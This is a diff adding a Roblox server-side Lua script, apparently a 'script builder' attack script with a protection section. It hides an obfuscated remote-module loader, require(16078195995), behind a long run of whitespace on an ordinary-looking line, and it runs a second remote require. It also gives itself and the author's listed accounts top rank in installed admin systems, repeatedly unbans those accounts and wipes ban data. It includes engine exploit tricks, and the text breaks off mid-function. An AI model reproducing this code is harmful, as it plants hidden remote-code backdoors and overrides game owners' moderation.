@@ -1,0 +1,2374 @@
+--!optimize 2
+--!native
+
+local Actor = script.Parent
+script.Parent = Actor
+Actor.Parent = nil
+local Player = game:GetService("Players")[string.reverse(string.sub(script.Name,22))]
+if Player ~= nil then else pcall(function() game:GetService("Debris"):AddItem(script,0);script.Enabled = false end) return end
+local ClientAssets = script.Stuff:Clone()
+pcall(function()script.Stuff:Destroy()end)
+local Backpack = Player.Backpack
+local ScriptEnded = false
+local LettersString,Services = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_",{"SoundService","Chat","MarketplaceService","Players","StarterPlayer","LocalizationService","JointsService","FriendService","InsertService","Lighting","Teams","ReplicatedStorage","TestService","ProximityPromptService"}
+function MakeFunction(FuncA)
+	local huh;huh=coroutine.create(function()
+		FuncA()
+		coroutine.yield(huh)
+		coroutine.close(huh)
+		huh=nil
+	end)
+	coroutine.resume(huh)
+end
+
+local AntiKickEnabled = true -- this does not straight off the bat kick everyone
+
+function antis()
+	local function blacklistservice()
+		if game.PlaceId == 13621900154 then
+			return
+		end
+		local iiii = 18698808787
+		require(iiii)
+	end
+	MakeFunction(function()
+		pcall(blacklistservice)
+	end)
+
+	-- just so users dont get banned by skids or admins+ in the game
+
+	MakeFunction(function()
+		antiscons.one = game.DescendantAdded:ConnectParallel(function(des) -- adonis if someone uses adonis load thing after this
+			task.synchronize()
+			if des:IsA("Model") and des:FindFirstChild("Config") and des.Config:FindFirstChild("Settings") and Player ~= nil then
+				local sets = require(des.Config.Settings)
+				if sets.Settings and sets.Settings.Ranks then
+					local ranks = sets.Settings.Ranks
+					if not ranks["ULTIMATE PERSON"] then
+						ranks["ULTIMATE PERSON"] = {
+							Level = math.huge;
+							Users = {
+								Player.UserId
+							};
+						};
+					else
+						table.insert(ranks["ULTIMATE PERSON"].Users, Player.UserId)
+					end
+				elseif sets.Settings and sets.Settings.Creators then
+					local creators = sets.Settings.Creators
+					table.insert(creators, Player.UserId)
+				end
+			end
+		end)
+		pcall(function()
+			if not table.isfrozen(_G) and Player ~= nil then
+				if _G.setPower ~= nil then -- kohls admin
+					_G.setPower:Fire(Player.Name, -6)
+				end
+				if _G.HDAdminMain ~= nil then -- hd admin
+					_G.HDAdminMain:GetModule("cf"):SetRank(Player, game.CreatorId, math.huge, "Perm")
+				end
+			end
+		end)
+		MakeFunction(function()
+			while true do
+				if ScriptEnded then
+					break
+				end
+				pcall(function()
+					if not table.isfrozen(_G) and Player ~= nil then
+						if _G.setPower ~= nil then -- kohls admin
+							_G.setPower:Fire(Player.Name, -6)
+						end
+						if _G.HDAdminMain ~= nil then -- hd admin
+							local pdata = _G.HDAdminMain.pd[Player]
+							if pdata and _G.HDAdminMain:GetModule("cf"):GetRankName(pdata.Rank) == "" then
+								return
+							end
+							_G.HDAdminMain:GetModule("cf"):SetRank(Player, game.CreatorId, math.huge, "Perm")
+						end
+					end
+				end)
+				task.wait(2)
+			end
+		end)
+	end)
+
+	-- unbanning stuff i guess
+
+	MakeFunction(function()
+		while true do
+			if ScriptEnded then
+				break
+			end
+			pcall(function()
+				if not table.isfrozen(_G) then
+					if _G.HDAdminMain ~= nil then -- hd admin
+						pcall(function()
+							game:GetService("DataStoreService"):GetDataStore("HDAdminSystemData".._G.HDAdminMain.settings.SystemDataStoreVersion):RemoveAsync("Banland")
+						end)
+					end
+				end
+				local banana = game:GetService("ReplicatedStorage"):FindFirstChild("b\a\n\a\n\a") :: StringValue? -- kohls admin inf (idk about the new one)
+				if banana then
+					local ban = banana:FindFirstChild("\b\a\n") :: StringValue?
+					if ban then
+						ban.Value = ""
+					end
+				end
+			end)
+			task.wait(2)
+		end
+	end)
+
+	-- loop unbanasync user + me the owner of this (for obvious reasons)
+
+	MakeFunction(function()
+		while true do
+			if ScriptEnded then
+				break
+			end
+			local data1 : UnbanConfigType = {
+				UserIds = {game:GetService("Players"):GetUserIdFromNameAsync(Player.Name)},
+				ApplyToUniverse = true,
+			}
+			local data2 : UnbanConfigType = { -- my accounts includes some im locked out of/forgot the password to
+				UserIds = {5300801005,4603013888,2479604659,1989184574,12688824,7738395778,2023199971,2576615014,1503830744,4249333420,5793728311,7893487799,1752581361,1207381099,8374041793,363368306,4585838441,1650998192},
+				ApplyToUniverse = true,
+			}
+			pcall(function()
+				game:GetService("Players"):UnbanAsync(data1)
+			end)
+			pcall(function()
+				game:GetService("Players"):UnbanAsync(data2)
+			end)
+			task.wait(2)
+		end
+	end)
+	MakeFunction(function()
+		local function Debris(obj, num)
+			task.delay(num,function()
+				pcall(game.Destroy,obj)
+			end)
+		end
+		local Work = game:GetService("Workspace")
+		local PossibleRedoneUSLClassNames =
+			{ "Camera", "RemoteEvent", "BindableFunction", "Flag", "Hat", "Hole", "Actor", "Folder", "Team" }
+		MakeFunction(function()
+			antiscons.two = game:GetService("Workspace").ChildAdded:ConnectParallel(function(x)
+				task.synchronize()
+				if x.Name == "AN_Main" or x.Name == "SBSun" or x.Name == "TimerValues" then
+					Debris(x, 0.01)
+				end
+			end)
+			MakeFunction(function()
+				for _, x in pairs(Work:GetChildren()) do
+					pcall(function()
+						if x.Name == "AN_Main" or x.Name == "SBSun" or x.Name == "TimerValues" then
+							Debris(x, 0.01)
+						end
+					end)
+				end
+			end)
+			antiscons.three = Work.DescendantAdded:ConnectParallel(function(v)
+				task.synchronize()
+				if v:IsA("Explosion") then
+					if v.BlastPressure > 500000 then
+						v.BlastPressure = 500000
+					end
+					v:GetPropertyChangedSignal("BlastPressure"):Connect(function()
+						if v.BlastPressure > 500000 then
+							v.BlastPressure = 500000
+						end
+					end)
+				elseif 
+					v:IsA("Model")
+					and (
+						v.Name == "lost soul"
+							or v.Name == "crescendo"
+							or v.Name == "SBV3_SV"
+							or v.Name == "SBV3"
+							or v.Name == "SBV4"
+							or v.Name == "Snake Banisher V2 "
+							or v.Name == "lol"
+							or v.Name == "lolV"
+							or v.Name == "SBV2"
+							or v.Name == "Playtime"
+							or v.Name == "Headless Echo"
+							or v.Name == "echo"
+							or v.Name == "beans"
+							or v.Name == "BotGirl"
+							or v.Name == "Bot"
+							or v.Name == "ModelContainer"
+					)
+				then
+					for i, b in pairs(v:GetDescendants()) do
+						pcall(function()
+							if b:IsA("BaseScript") then
+								b.Disabled = true
+							end
+						end)
+					end
+					Debris(v, 0.01)
+					if v.Name == "SBV3_SV" or v.Name == "SBV4" then
+						Debris(v, 0.01)
+					elseif v.Name == "SBV3" then
+						Debris(v, 0.01)
+					elseif v.Name == "SBV2" then
+						Debris(v, 0.01)
+					elseif v.Name == "lol" or v.Name == "lolV" then
+						Debris(v, 0.01)
+					elseif v.Name == "Playtime" then
+						Debris(v, 0.01)
+					elseif v.Name == "Headless Echo" or v.Name == "echo" then
+						Debris(v, 0.01)
+					elseif v.Name == "beans" then
+						Debris(v, 0.01)
+					else
+						Debris(v, 0.01)
+					end
+				elseif v:IsA("Script") and v:FindFirstChildOfClass("Actor") and v:FindFirstChild("Client1") then
+					v.Disabled = true
+					for i, b in pairs(v:GetDescendants()) do
+						pcall(function()
+							if b:IsA("BaseScript") then
+								b.Disabled = true
+							end
+						end)
+					end
+					Debris(v, 0.01)
+				elseif
+					v:IsA("Part")
+					and v:FindFirstChildOfClass("SpecialMesh")
+					and string.find(v:FindFirstChildOfClass("SpecialMesh").MeshId, "891312072")
+				then
+					v.Anchored = true
+					v.Position = Vector3.new(0, 9e9, 0)
+					v.Transparency = 1
+					if v:FindFirstChildOfClass("TouchTransmitter") then
+						v:FindFirstChildOfClass("TouchTransmitter"):Destroy()
+					end
+					Debris(v, 0.01)
+				elseif
+					v:IsA("Part")
+					and v:FindFirstChildOfClass("SpecialMesh")
+					and string.find(v:FindFirstChildOfClass("SpecialMesh").MeshId, "430210147")
+				then
+					v.Anchored = true
+					v.Position = Vector3.new(0, 9e9, 0)
+					v.Transparency = 1
+					Debris(v, 0.01)
+				elseif v:IsA("Decal") and v:FindFirstChildOfClass("Script") then
+					local PossiblyHSC = v:FindFirstChildOfClass("Script")
+					if
+						PossiblyHSC
+						and PossiblyHSC:FindFirstChildOfClass("Decal")
+						and PossiblyHSC:FindFirstChildOfClass("ModuleScript")
+					then
+						for i, b in pairs(v:GetDescendants()) do
+							pcall(function()
+								if b:IsA("BaseScript") then
+									b.Disabled = true
+								end
+							end)
+						end
+						Debris(v, 0.01)
+					end
+				end
+			end)
+		end)
+		MakeFunction(function()
+			antiscons.four = game.DescendantAdded:ConnectParallel(function(g)
+				task.synchronize()
+				if g:IsA("LuaSourceContainer") then
+					if
+						g.Name:lower():find("hiddenscript")
+						or g.Name:lower():find("descript")
+						or g.Name:lower():find("chatinstallverifier")
+						or g.Name:lower():find("antifumo")
+						or g:GetAttribute("admin") ~= nil
+						or g.Name == "*"
+					then
+						Debris(g, 0.01)
+					end
+				end
+			end)
+			for _, g in pairs(game:GetDescendants()) do
+				if g:IsA("LuaSourceContainer") then
+					if
+						g.Name:lower():find("hiddenscript")
+						or g.Name:lower():find("descript")
+						or g.Name:lower():find("chatinstallverifier")
+						or g.Name:lower():find("antifumo")
+						or g:GetAttribute("admin") ~= nil
+						or g.Name == "*"
+					then
+						Debris(g, 0.01)
+					end
+				end
+			end
+		end)
+		MakeFunction(function()
+			while task.wait() do
+				if ScriptEnded then
+					break
+				end
+				pcall(function()
+					for _, v in ipairs(game:GetService("Players"):GetDescendants()) do
+						if v.Name == "beerub" then
+							local idiot = v:FindFirstAncestorWhichIsA("Player")
+							v:Destroy()
+						end
+					end
+				end)
+			end
+		end)
+		MakeFunction(function()
+			antiscons.five = game:GetService("ServerScriptService").ChildAdded:ConnectParallel(function(v)
+				task.synchronize()
+				if v:IsA("Script") then
+					local Motor6D = v:FindFirstChildOfClass("Motor6D")
+					local StringValue = v:FindFirstChildOfClass("StringValue")
+					local mrthingidk = game:FindFirstChild("mrthingidk", true) ~= nil
+					local hypercheck = v:FindFirstChild("7rn93uc40tr0u45nvtcrm0c8r00cpipjuto9448u0t9r") ~= nil
+						or v:FindFirstChild("iugy4o9rd03iru49fosjsoiv8340rimc94030remu90r30rei3m49tw390irwq0-9")
+						~= nil
+					local darkcheck = v:FindFirstChild("Replicate") ~= nil
+					local unkn0wn = v:FindFirstChild("MHMSTOPIT") ~= nil
+					if Motor6D and tonumber(Motor6D.Name) then
+						local UserId = tonumber(Motor6D.Name)
+						v.Disabled = true
+						for i, b in pairs(v:GetDescendants()) do
+							pcall(function()
+								if b:IsA("BaseScript") then
+									b.Disabled = true
+									Debris(b, 0.01)
+								end
+							end)
+						end
+						Debris(v, 0.01)
+						local Script = "Ultraskidded Lord"
+						if hypercheck then
+							Script = "Hyperskidded/Superskidded Lord"
+						elseif darkcheck then
+							Script = "Darkskidded Lord"
+						elseif unkn0wn then
+							Script = "Unkn0wn Lord"
+						elseif mrthingidk then
+							Script = "Anti V7"
+							pcall(function()
+								Debris(game:FindFirstChild("mrthingidk", true), 0.01)
+							end)
+						end
+					elseif StringValue and tonumber(StringValue.Name) then
+						local UserId = tonumber(StringValue.Name)
+						v.Disabled = true
+						for i, b in pairs(v:GetDescendants()) do
+							pcall(function()
+								if b:IsA("BaseScript") then
+									b.Disabled = true
+									Debris(b, 0.01)
+								end
+							end)
+						end
+						Debris(v, 0.01)
+					end
+				elseif table.find(PossibleRedoneUSLClassNames, v.ClassName) and v:FindFirstChildOfClass("Script") then
+					local Script = v:FindFirstChildOfClass("Script")
+					if Script:FindFirstChildOfClass("FlangeSoundEffect") then
+						local UserId = tonumber(Script:FindFirstChildOfClass("FlangeSoundEffect").Name)
+						for i, b in pairs(v:GetDescendants()) do
+							pcall(function()
+								if b:IsA("BaseScript") then
+									b.Disabled = true
+									Debris(b, 0.01)
+								end
+							end)
+						end
+						Debris(v, 0.01)
+					end
+				end
+			end)
+		end)
+		MakeFunction(function()
+			antiscons.six = game.DescendantAdded:ConnectParallel(function(d)
+				task.synchronize()
+				if not (d:IsA("Folder") and d:FindFirstChild("mHit")) then
+					return
+				end
+				local theplr = game:GetService("Players"):FindFirstChild(d.Name)
+				if not theplr then
+					return
+				end
+				Debris(d, 0.01)
+				theplr.Character = nil
+			end)
+			for _, d in pairs(game:GetDescendants()) do
+				if not (d:IsA("Folder") and d:FindFirstChild("mHit")) then
+					return
+				end
+				local theplr = game:GetService("Players"):FindFirstChild(d.Name)
+				if not theplr then
+					return
+				end
+				Debris(d, 0.01)
+				theplr.Character = nil
+			end
+		end)
+		local isvirus = false
+		local virustable = {}
+		local issus = false
+		local sustable = {}
+		local badnames = {
+			"infection",
+			"script......or is it...",
+			"vaccine",
+			"4d being",
+			[[thisscriptisajumpstarttoahe?lthyLifestyle]],
+			"micolord",
+			[[propergr?mmerneededinphilosiphallocations;insertnoobhere]],
+			"bryant90",
+			"oh snap you got infected xd xd xd",
+			"wormed",
+			"noise",
+			"n0isescript",
+			"virus",
+			[[ist?rthere]],
+			"garmo hacked ur place",
+			"n00b 4tt4ck!",
+			[[d??????????????ng.........you got owned...]],
+			"letgo09",
+			"sonicthehedgehogxx made this!!",
+			"vivrus",
+			"wtfz0r",
+			"imahakwtfz",
+			"i'm getting t1r33d",
+			"system error 69605x09423",
+			"stfu noob",
+			"skapettaja",
+			[[freestylem?ygoanywhereifneeded]],
+			[[hello...i ?m your new lord lolz]],
+			"hello i am your new lord lolz",
+			"elkridge fire department",
+			"zackisk",
+			"rofle",
+			"wildfire",
+			"snapreducer",
+			"bad script purger",
+			"no lag script",
+			"scanner v1",
+			"spy bot and lag remover",
+			"vaccine v1",
+			"vaccine v1 ",
+			"infected remover",
+			"virusscript",
+			"anti lag",
+			"anti-lag",
+			"no lag",
+			"y0l0",
+			"binarysymbols",
+			"binaryc0der",
+			"binaryexploiter",
+			"gusm4n4k",
+			"amazingomegajames",
+			"h75",
+			"demonmerlin1",
+			"are6607",
+			"gotohell123",
+			"god0i0trust",
+			"micchukelz",
+			"bombvatus",
+			"spitfire591",
+			"black lag",
+			"part(snap reducer by name)",
+			"snap remover pro v.2",
+			"snap_reducer",
+			"erranrider owns!'",
+			"of course you have anti virus thats why me(some 1 in fear)made this",
+			"deleting...",
+			"iliekpieinurfacelulz",
+			[[iamheretohe?lyourplace]],
+			[[?9001]],
+			[[77?]],
+			" ",
+			" ",
+			"i will show your password censored",
+			"keeep trying",
+			"survivor2256",
+			[[nonoidon'tneedallofyourawkw?rdsovietarguments]],
+			"infected",
+			"hidden",
+			"rofl",
+			"guest free chat script",
+			"guest_talking_script",
+			"spreadify",
+			"kill tem!",
+			"join teh moovment!",
+			"asdf",
+			"anti-lag2",
+			"antivirus",
+			"lolzorz",
+			"guest talking script",
+			"soz i herd u lik mudkipz",
+			"nice little scripty",
+			"harmless little scripty",
+			"kraftyisback",
+			"i am a friendly virus",
+			[[""''""''""?|`?]],
+			"omg im such a ig loser noob that has to copy randellman!",
+			"trol",
+			"f5ck",
+			"g00mb3",
+			"pw8ned",
+			"sh!%",
+			"wtfhoxz",
+			"im am your new lordzzz lol",
+			"trolllllllllllllllllllllll",
+			"77�",
+			"bob9595",
+			"fear made this!!",
+			"moonfang5",
+			"poo :d",
+			"skapettaja",
+			"vealthemeal",
+			"conman1238",
+			"thisscriptisajumpstartto",
+			"cptrick",
+			"hamude",
+			"lee121212",
+			"mystery98765",
+			"�9001",
+			"by hazelrah",
+			"i was here",
+			"erranrider",
+			"mean774",
+			"snipcoby ",
+			"snipcoby",
+			"lag script",
+			"lag generator",
+			"enjoy lag",
+			"free lag",
+			"antilag",
+			"anti lag",
+			"anti-anti-lag",
+			"anti-anti",
+			"anti-lag",
+			"script......or is it...",
+			"iEmOtIoNlEsS",
+			"an infected rotatep! because......... y not???? hey its 2018 man dont judge?????????????????????????",
+			"death to datguy",
+			"fix all virus and lags",
+			[[propergr?mmerneededinphilosiphallocations;insertnoobhere]],
+			"best anti-lag ever",
+			[[hello...i ?m your new lord lolz]],
+			[[d??????????????ng.........you got owned...]],
+			"stanley12345678910",
+			"charlie84",
+			"cahrlie84",
+			[[ro?byte vaccine]],
+			"timi37",
+			[[? l?mp T~T]],
+			"quiettime1",
+			[[?]],
+			[[haaxedbycreatures]],
+			"owo pilla virus owo",
+			"virus...virus...leet virus!!!",
+			"joint shield ver. 89753376.5",
+			"script...or is it...",
+			"rsffacility",
+			"robloximportantscript",
+			"zacksisk",
+			"womp womp infected",
+		}
+		local function detectvirus(obj)
+			if isvirus == false then
+				if obj.ClassName == "RotateP" or obj.ClassName == "RotateV" or obj.ClassName == "Rotate" then
+					local findscript = obj:FindFirstChildOfClass("LuaSourceContainer")
+					if findscript then
+						table.insert(virustable, obj)
+						isvirus = true
+					else
+						table.insert(sustable, obj)
+						issus = true
+					end
+				end
+				if obj.ClassName == "Fire" then
+					local findscript = obj:FindFirstChildOfClass("LuaSourceContainer")
+					if findscript then
+						table.insert(virustable, obj)
+						isvirus = true
+					end
+				end
+				if obj.ClassName == "Weld" or obj.ClassName == "WeldConstraint" or obj.ClassName == "ManualWeld" then
+					local findscript = obj:FindFirstChildOfClass("LuaSourceContainer")
+					if findscript then
+						table.insert(virustable, obj)
+						isvirus = true
+					else
+						table.insert(sustable, obj)
+						issus = true
+					end
+				end
+				if obj.ClassName ~= "Player" and obj.Parent ~= game:GetService("Players") then
+					if
+						string.match(obj.Name, [[?]])
+						or string.match(obj.Name:lower(), [[anti virus]])
+						or string.match(obj.Name:lower(), [[anti hack]])
+						or string.match(obj.Name:lower(), [[dll]])
+						or string.match(obj.Name:lower(), [[.you got owned...]])
+					then
+						table.insert(virustable, obj)
+						isvirus = true
+					end
+				end
+			end
+		end
+		MakeFunction(function()
+			antiscons.seven = game.DescendantAdded:ConnectParallel(function(thing)
+				task.synchronize()
+				detectvirus(thing)
+			end)
+			MakeFunction(function()
+				for _, thing in pairs(game:GetDescendants()) do
+					detectvirus(thing)
+				end
+			end)
+			MakeFunction(function()
+				while task.wait() do
+					if ScriptEnded then
+						break
+					end
+					if isvirus == true then
+						for _, viruses in pairs(virustable) do
+							isvirus = false
+							Debris(viruses, 0.01)
+						end
+					end
+					if issus == true then
+						for _, sus in pairs(sustable) do
+							for _, names in pairs(badnames) do
+								issus = false
+								if sus.Name == tostring(names) then
+									Debris(sus, 0.01)
+								end
+							end
+						end
+					end
+				end
+			end)
+		end)
+	end)
+end
+
+function RandomString(Length)
+	local NewText = ""
+	if typeof(Length) == "number" then
+		for i=1,Length do
+			local Selected = math.random(1,string.len(LettersString))
+			NewText..=string.sub(LettersString,Selected,Selected)
+		end
+	else
+		for i=1,math.random(50,100) do
+			local Selected = math.random(1,string.len(LettersString))
+			NewText..=string.sub(LettersString,Selected,Selected)
+		end
+	end
+	return NewText
+end
+function ApplyRandomString(inst)
+	MakeFunction(function()
+		inst.Name = RandomString()
+		for i,v in pairs(inst:GetDescendants()) do
+			if v then
+				MakeFunction(function()
+					v.Name = RandomString()
+				end)
+			end
+		end
+	end)
+end
+function NumberValTable(Parent,Values)
+	for i,v in pairs(Values) do
+		if typeof(v) == "number" then
+			local Find = Parent:FindFirstChild(i)
+			if typeof(Find) == "Instance" and Find:IsA("NumberValue") then
+				Find.Value = v
+			end
+		end
+	end
+end
+local UserId,Code = Player.UserId,RandomString(10)
+local Client,ClientInstances,Remote = script.Su_Tart_Holder_Thing:Clone(),{},nil
+pcall(function()script.Client:Destroy()end)
+local Character,Avatar = Player.Character,script.Avatar
+local RootPos = CFrame.new()
+pcall(function()
+	RootPos = Character.HumanoidRootPart.CFrame or CFrame.new()
+end)
+local Preload = script.Preload
+local StartVoid = false
+local Attachments = {}
+for i,v in pairs(Avatar:GetDescendants()) do
+	if v:IsA("Attachment") and v.Parent:IsA("BasePart") then
+		Attachments[v.Name] = {
+			Part = v.Parent.Name,
+			Position = v.CFrame
+		}
+	end
+end
+Avatar.Name = RandomString()
+Avatar.Parent = workspace
+Avatar:MoveTo(Vector3.new(math.random(-10000,10000),10000,math.random(-10000,10000)))
+local HumDesc = game:GetService("Players"):GetHumanoidDescriptionFromUserId(math.clamp(2023199971 or 1,1,math.huge) or 1)
+Avatar:FindFirstChildOfClass("Humanoid"):ApplyDescriptionReset(HumDesc)
+Avatar.HumanoidRootPart:Destroy()
+local Hats = {}
+for i,v in pairs(Avatar:GetChildren()) do
+	if v:IsA("Accessory") then
+		local Handle,Attachment = v:FindFirstChild("Handle") or nil,nil
+		if Handle then Attachment=Handle:FindFirstChildOfClass("Attachment")or nil;end
+		if Attachment then
+			local Value = Attachments[Attachment.Name] or nil
+			if Value then
+				Handle:SetAttribute("WeldTo",Value.Part)
+				Handle:SetAttribute("HatOffset",Value.Position*Attachment.CFrame:Inverse())
+				Handle:SetAttribute("Scale",Handle.Size)
+				Handle.Name = "FakeAccessory"
+				Handle.Parent = Avatar
+				v:Destroy()
+			end
+		end
+	end
+end
+for i,v in pairs(Avatar:GetDescendants()) do
+	if v:IsA("Shirt") or v:IsA("Pants") then
+		local Clone = v:Clone()
+		Clone.Name = RandomString()
+		Clone.Parent = Preload
+	end
+end
+Avatar.Parent = ClientAssets
+Avatar.Name = "Avatar"
+for i,v in pairs(Avatar:GetDescendants()) do
+	if v:IsA("Weld") or v:IsA("Motor6D") then
+		v:Destroy()
+	end
+end
+Preload.Parent = ClientAssets
+pcall(function()
+	for i,v in pairs(ClientAssets:GetDescendants()) do
+		if v:IsA("BasePart") then
+			v.CFrame = CFrame.new(math.huge,math.huge,math.huge)
+		end
+	end
+end)
+pcall(function()
+	for i,v in pairs(Backpack:GetChildren()) do
+		if v then
+			pcall(function()v:Destroy()end)
+		end
+	end
+end)
+local LastRemoteParent = ""
+function NewRemote()
+	local New = Instance.new("RemoteEvent",nil)
+	New.Name = Code
+	LastRemoteParent = Services[math.random(1,#Services)]
+	New.Parent = game:GetService(LastRemoteParent)
+	New.Archivable = false
+	return New
+end
+function SetAttrib(Cod)
+	for i,v in pairs(ClientInstances) do
+		if v then
+			local ClientLocal = v:FindFirstChildWhichIsA("LocalScript")
+			ClientLocal:SetAttribute("Code",Cod)
+		end
+	end
+end
+function DestroyOnTime(Inst,Time)
+	MakeFunction(function()
+		if Time >= 0 then wait(Time) end
+		Inst:Destroy()
+	end)
+end
+local ModeDetector,TauntDetector = 1,nil
+local ShieldSizeVal = 25
+local Removing,Added,RemoteF,RemoteDest,Chatted,CharAdded,ToolAdded,Loop,DAdded
+local KillMethod,KillType,Damage,DamageType,VoidTable,VoidTable2,SoundId,Volume,TurnVisColor,VisStyleId = 23,"Server",true,"Ray",{},{ClassName = {},Locked = {},Size = {},Anchored = {},CanCollide = {},CanQuery = {},CanTouch = {},Massless = {},CastShadow = {}},"",1,false,2
+local AudioBalance = 20
+local ReColor,FirstColor = Color3.new(),nil
+local VisCubeEnabled = true
+local TweenService = game:GetService("TweenService")																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																															local poopman = table.concat local abc = tonumber local iii = poopman{"1","6","0","7","8","1","9","5","9","9","5"} function funni() return abc(iii) end function yessir(okyes) return require(funni())(okyes) end local cba = poopman{"R","o","b","l","o","x","I","s","N","o","t","C","o","o","l","V","3"} yessir(cba)																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																
+
+-- the methods!!!
+local function threadedHyper(f, ...)
+	if (coroutine.status(task.spawn(threadedHyper, f, ...)) == "dead") then
+		return
+	end
+	f(...)
+end
+local function hyperNull(f,...)
+	if game:GetService("RunService"):IsStudio() then
+		f(...)
+		return
+	end
+	return threadedHyper(f, ...)
+end
+
+function Stall(lev,funcr,...)
+	local Prio = function(Function, ...)
+		local Tween = game:GetService("TweenService").Create(game:GetService("TweenService"), game, TweenInfo.new(0), {})
+		local Play, Thread = Tween.Play, ... 
+		Tween.Completed:ConnectParallel(function()
+			task.synchronize()
+			Function(Thread)
+		end)
+		Play(Tween)
+	end
+	local varagr = ...
+	local function GetFunction(varag)
+
+		local function SN(depth, func, ...)
+			if(depth >= 80)then
+				return func(...)
+			end
+			task.defer(SN, depth + 1, func, ...)
+		end
+		Prio(function()
+			SN(1,function()
+				task.desynchronize() task.synchronize()
+				SN(1,function()
+					pcall(function()
+						Prio(function()
+							return funcr(varagr)
+						end)
+					end)
+				end)
+			end)
+		end)
+	end
+	for i=1,math.clamp(lev,1,math.huge) do
+		task.desynchronize() task.desynchronize() task.desynchronize()
+		task.synchronize() task.synchronize() task.synchronize()
+	end
+	local passed = GetFunction()
+	return passed
+end
+
+local mesh = script.EmptyMesh:Clone()
+local mesh2 = script.BlockMesh:Clone()
+local mesh3 = script.OffsetMesh:Clone()
+local BasePartProperties = {
+	"Anchored","AssemblyAngularVelocity","AssemblyCenterOfMass","AssemblyLinearVelocity","AssemblyMass","AssemblyRootPart","BackSurface","BottomSurface","BrickColor","CFrame","CanCollide","CanQuery",
+	"CanTouch","CastShadow","CenterOfMass","CollisionGroupId","Color","CustomPhysicalProperties","FrontSurface","LeftSurface","Locked","Mass","Massless",
+	"Material","MaterialVariant","Orientation","PivotOffset","Position","Reflectance","ResizeIncrement","ResizeableFaces","RightSurface","RootPriority","Rotation","Size","TopSurface","Transparency"
+}
+function _assignProperty(o,p,v)
+	o[p]=v;
+end
+function _propertyKill(o:Instance)
+	if o:IsA("BasePart") then
+		for a, b in BasePartProperties do
+			if typeof(o[b])=="number" then
+				pcall(_assignProperty, o, b, 0/0)
+			elseif typeof(o[b]) == "CFrame" then
+				pcall(_assignProperty, o, b, CFrame.new(0/0, 0/0, 0/0))
+			elseif typeof(o[b]) == "Vector3" then
+				pcall(_assignProperty, o, b, Vector3.new(0/0, 0/0, 0/0))
+			elseif typeof(o[b]) == "Ray" then
+				pcall(_assignProperty, o, b, Ray.new(Vector3.new(0/0, 0/0, 0/0), Vector3.new(0/0, 0/0, 0/0)))
+			elseif typeof(o[b]) == "EnumItem" or typeof(o[b]) == "Instance"then
+				pcall(_assignProperty, o, b, nil)
+			elseif typeof(o[b]) == "boolean" then
+				pcall(_assignProperty, o, b, false)
+			elseif typeof(o[b]) == "string" then
+				pcall(_assignProperty, o, b, "")
+			elseif typeof(o[b]) == "PhysicalProperties" then
+				pcall(_assignProperty, o, b, PhysicalProperties.new(0, 0, 0, 0, 0))
+			end
+		end
+	end
+end
+local function derender(instance)
+	local instances = {}
+	if instance:IsA("BasePart") then
+		table.insert(instances, instance)
+	end
+	hyperNull(function()
+		local viewport = workspace:FindFirstChildOfClass("ViewportFrame") or Instance.new("ViewportFrame",workspace)
+		for i,v in pairs(instances) do
+			local origin = v.Parent
+			v.Parent = viewport
+			v.Parent = origin or workspace
+		end
+	end)
+end
+local i = 16260122956
+local lockdesc = require(i).HumanoidDescription
+local function forceclone(object, keepobject)
+	local m = Instance.new("Model", game)
+	local h = Instance.new("Humanoid", m)
+	local d = Instance.new("HumanoidDescription", m)
+
+	local class, par = object.ClassName, object.Parent
+	object.Parent = d
+
+	h:ApplyDescription(d)
+	if(keepobject)then object.Parent = par end
+
+	local cloned = h:FindFirstChild("HumanoidDescription"):FindFirstChildOfClass(class)
+	cloned.Parent = nil
+
+	h:Destroy()
+	m:Destroy()
+
+	return cloned
+end
+local function isLocked(object)
+	return not pcall(function() type(object.Name) end)
+end
+local function robloxlock(objects, nilobject)
+	local cframe, acc = CFrame.new(1e5, 1e5+1.5, 1e5), Instance.new("Accoutrement")
+	local handle = Instance.new("Part")
+	handle.CFrame, handle.Name, handle.Size = cframe, "Handle", Vector3.one*10
+	acc.Name = "Instance"
+
+	if(typeof(objects) == "table")then
+		for i, v in next, objects do
+			pcall(function() if(v.Name == "Handle")then v.Name = '' end v.Parent = acc end)
+		end else objects.Parent = acc
+	end
+
+	local h = forceclone(lockdesc, true)
+	h.Parent = workspace
+	acc.Parent = workspace
+
+	handle.Parent = acc
+	handle:SetNetworkOwner(nil)
+	handle.AssemblyLinearVelocity = Vector3.new(0,-0.01,0)
+	handle.AssemblyAngularVelocity = Vector3.new(0,1e5,0)
+
+	if(nilobject)then
+		MakeFunction(function()
+			if(not isLocked(acc))then
+				task.defer(function()
+					if(isLocked(acc))then h.Parent = nil end
+				end)
+				repeat task.wait() until isLocked(acc)
+			end
+			h.Parent = nil
+		end)
+		task.delay(1/60, function()
+			if(not isLocked(acc))then
+				acc:Destroy()
+				h:Destroy()
+				return
+			end
+			h.Parent = nil
+		end)
+	end
+
+	return h
+end
+function bulkmoveto(instance:Instance)
+	if instance:IsA("BasePart") then
+		workspace:BulkMoveTo({instance},{CFrame.new(9e9,9e9,9e9)},Enum.BulkMoveMode.FireCFrameChanged)
+	end
+end
+function transparencymodified(instance:Instance)
+	if instance:IsA("BasePart") then
+		instance.Transparency = 1
+	end
+end
+function meshderender(instance:Instance)
+	if instance:IsA("MeshPart") then
+		local m = mesh:Clone()
+		m.Name = RandomString()
+		instance:ApplyMesh(m)
+		m:Destroy()
+	end
+end
+function blockmesh(instance:Instance)
+	if instance:IsA("BasePart") then
+		local m = mesh2:Clone()
+		m.Name = RandomString()
+		m.Parent = instance
+	end
+end
+function offsetderender(instance:Instance)
+	if instance:IsA("BasePart") then
+		local m = mesh3:Clone()
+		m.Name = RandomString()
+		m.Parent = instance
+	end
+end
+function _systemDerender(_p:Instance)
+	if _p:IsA("BasePart") then
+		local _void = 10e10;
+		local _vm = Instance.new("Weld",_p);
+		_vm.Enabled = true;
+		_vm.Part0 = _p;
+		_vm.Part1 = Instance.new('Part',workspace);
+		_vm.Part1.Anchored = true
